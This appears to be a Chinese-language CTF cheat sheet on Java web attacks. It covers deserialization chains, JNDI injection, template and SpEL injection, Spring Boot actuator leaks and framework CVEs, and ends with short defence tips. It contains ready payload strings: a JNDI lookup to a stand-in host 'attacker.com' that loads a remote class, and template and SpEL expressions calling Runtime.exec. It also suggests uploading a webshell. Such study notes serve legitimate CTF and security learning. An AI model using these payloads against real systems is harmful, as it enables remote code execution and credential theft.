# Java 安全

## 概述

Java 在 CTF Web 题中通常出现在 Spring Boot、Apache Shiro、Fastjson 等框架的漏洞利用场景。Java 反序列化漏洞、SpEL 表达式注入、模板注入（SSTI）是最高频的考点。由于 Java 生态庞大，各种中间件和框架的组合也带来了丰富的攻击面。

## 常见攻击手法

### 1. 反序列化

Java 反序列化是 CTF 中最经典也是难度最高的考点之一。

- **原理**：`ObjectInputStream.readObject()` 在反序列化时调用 `readObject()` 或 `readResolve()` 方法，攻击者构造恶意序列化数据触发危险操作。

- **常见反序列化链**：
  - **CommonsCollections**：Apache Commons Collections 库中的多个链（CC1-CC7），利用 `InvokerTransformer`、`ChainedTransformer`、`LazyMap` 等类实现 RCE
  - **Fastjson**：`parseObject()` 自动调用 setter/getter，通过 `@type` 指定目标类触发反序列化。历史漏洞包括 `JdbcRowSetImpl` 的 JNDI 注入
  - **Jackson**：开启 `enableDefaultTyping` 后可触发反序列化
  - **Shiro**：Shiro 框架使用 `CookieRememberMeManager` 时，若密钥泄露则可通过构造恶意 RememberMe Cookie 实现反序列化 RCE
  - **XStream**：XML 反序列化，通过构造特殊 XML 触发任意代码执行
  - **Hessian**：基于二进制的反序列化协议，存在类似 CommonsCollections 的利用链

- **JNDI 注入**：
  - `InitialContext.lookup("ldap://attacker.com/evil")` 可攻击者加载远程恶意类
  - 利用工具：`marshalsec` 启动恶意的 LDAP/RMI 服务器
  - JDK 版本限制：JDK 8u191+ 默认禁止远程加载类，但仍可通过本地类路径中的类绕过（如 `Tomcat`、`Groovy`）

- **利用工具**：
  - **ysoserial**：生成各种 Java 反序列化 payload 的标杆工具
  - **marshalsec**：RMI/LDAP 服务器，配合 JNDI 注入

### 2. 模板注入 (SSTI)

- **Velocity**：`#set()` 指令可执行任意 Java 代码。`#set($x=$foo.class.forName('java.lang.Runtime').getMethod('exec','cat flag'))`
- **FreeMarker**：`<#assign>` 指令结合 `freemarker.template.utility.Execute?new("cat flag")` 执行命令
- **Thymeleaf**：`th:include`、`th:replace`、`th:insert` 等属性可能导致表达式注入
- **Expression Language (EL) 注入**：`${7*7}` 检测，利用 `Runtime.getRuntime().exec()` 执行命令

### 3. SpEL 注入

Spring 表达式语言（SpEL）注入常见于 Spring Boot 应用。

- **检测**：`${7*7}` 返回 `49`
- **利用 Payload**：
  - `T(java.lang.Runtime).getRuntime().exec('calc')`
  - `''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(...)`
- **触发场景**：Spring 注解参数、`@Value`、XML 配置、`SpelExpressionParser.parseExpression()`

### 4. 命令执行

- **Runtime.exec()**：标准命令执行方法，但需注意参数分割问题（不支持管道和重定向）
- **ProcessBuilder**：更灵活的命令执行方式
- **反序列化 RCE**：通过 ysoserial 在目标服务器上执行命令

### 5. 文件操作

- **路径遍历**：`getResource()`、`getFile()`、`new File()` 等操作若未做路径校验可读取任意文件
- **文件上传 RCE**：在 ROOT 目录上传 JSP Webshell
- **Spring Boot 敏感端点**：
  - `/actuator` - 端点列表
  - `/actuator/env` - 环境变量（可能泄露密钥）
  - `/actuator/heapdump` - 堆转储（可分析出密码/Token）
  - `/actuator/jolokia` - JMX 管理（可能执行 MBean 方法）

### 6. 框架漏洞

- **Spring4Shell (CVE-2022-22965)**：Spring MVC 参数绑定 RCE
- **Log4j2 (CVE-2021-44228)**：JNDI 注入 RCE
- **Shiro 密钥泄露**：RememberMe Cookie 反序列化
- **Fastjson 反序列化**：多个版本的 `autoType` 绕过历史

## 相关工具

| 工具 | 用途 |
|------|------|
| ysoserial | Java 反序列化 Payload 生成 |
| marshalsec | RMI/LDAP 恶意服务器 |
| ShiroExploit | Shiro 反序列化利用 |
| FastjsonTool | Fastjson 探测与利用 |
| JackSonFaster | Jackson 反序列化利用 |

## 防御建议

- 对反序列化输入做白名单校验或使用 `ValidatingObjectInputStream`
- 升级 JDK 到较高版本（8u191+）
- 关闭 Actuator 端点暴露或添加认证
- 使用高版本依赖（修复已知反序列化链）

## CTF 中的常见考点

- ysoserial 生成 CommonsCollections Payload 实现 RCE
- Fastjson `@type` JNDI 注入
- Shiro RememberMe 密钥爆破后反序列化
- Spring Boot Actuator 端点信息泄露

## 相关技能

- [Python](Python.md)
- [PHP](PHP.md)
- [反序列化](Java.md)
- [高级语言逆向](../逆向工程/高级语言逆向.md)
